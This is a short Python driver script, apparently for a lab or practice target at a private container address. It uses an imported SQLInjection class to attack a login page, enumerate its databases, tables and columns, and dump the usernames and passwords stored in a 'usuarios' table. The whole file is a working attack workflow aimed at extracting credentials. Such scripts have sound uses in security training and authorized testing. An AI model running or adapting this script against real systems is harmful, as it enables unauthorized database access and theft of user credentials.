#!/usr/bin/python3

from sqli import *
import sys, signal

def ctrlc(sig, frame):

    print("\nexit...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrlc)

if __name__ == '__main__':


    SQLi = SQLInjection("http://172.17.0.2/login_page/auth.php")

    print("\n====DATABASES====\n")

    SQLi.GetDatabases()

    print("\n===USERS TABLES=====\n")

    SQLi.GetTables("users")

    print("\n====USERS.USUARIOS COLUMNS====\n")

    SQLi.GetColumns("users", "usuarios")

    print("\n====USERS.USUARIOS DATA====\n")

    print("\n****USERNAMES****\n")

    SQLi.GetData("users", "usuarios", "USERNAME")

    print("\n****PASSWORDS****\n")

    SQLi.GetData("users", "usuarios", "PASSWORD")
